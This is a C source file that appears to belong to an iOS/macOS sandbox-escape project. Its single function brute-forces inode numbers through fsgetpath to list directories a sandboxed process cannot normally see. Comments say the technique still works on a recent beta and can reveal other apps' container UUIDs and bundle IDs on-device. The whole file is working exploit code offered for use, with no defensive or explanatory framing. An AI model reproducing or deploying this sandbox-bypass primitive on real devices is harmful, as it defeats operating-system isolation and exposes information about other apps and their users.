//
//  bad_query.c
//  bad_query
//
//  Created by Taj C on 7/21/26.
//

#include "bad_query.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <limits.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/fsgetpath.h>
#include <xpc/xpc.h>

// This still works on 27.0b5
// I'm including it here because it's very useful in the context of this sandbox escape, which can't access parent directories (most of the time)
// This enumerates all directories in a given path, so you can, for example, get all container UUIDs, read their container metadata to get their bundle ID, and derive that entirely on-device without a computer
char *bad_query_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) {
        if (statfs("/private/var", &sfs) != 0 && statfs("/var", &sfs) != 0) {
            return NULL;
        }
    }
    fsid_t fsid = sfs.f_fsid;
    
    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);
    
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    
    char buf[1200];
    for (uint64_t ino = 1; ino <= max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        
        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}
